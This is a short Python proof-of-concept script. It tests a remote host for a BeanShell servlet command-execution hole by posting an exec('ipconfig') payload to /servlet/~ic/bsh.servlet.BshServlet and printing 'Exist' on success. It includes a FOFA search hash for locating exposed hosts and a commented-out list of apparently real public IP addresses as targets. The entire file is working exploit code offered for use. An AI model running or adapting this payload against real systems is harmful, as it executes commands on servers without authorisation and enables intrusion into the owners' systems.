#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+          FOFA:icon_hash="1085941792"')

def run_proto(url):
    url = url + "/servlet/~ic/bsh.servlet.BshServlet"
    headers = {
            'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
              }
    data = 'bsh.script=exec("ipconfig")'
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=url, headers=headers, data=data, verify=False, timeout=5)
        if "Windows IP" in response.text and response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        return False

def run(ip, port):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}:{}'.format(proto[i], ip, port)
        if run_proto(url):
            return True
        else:
            i = i + 1

if __name__ == '__main__':
    title()
    #target = '61.136.109.109:8088;113.89.41.223:9080;223.244.237.208:8088'
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = target.split(':')[1]

    result = run(ip, port)

    if result:
        print('Exist')
    else:
        print('UnExist')

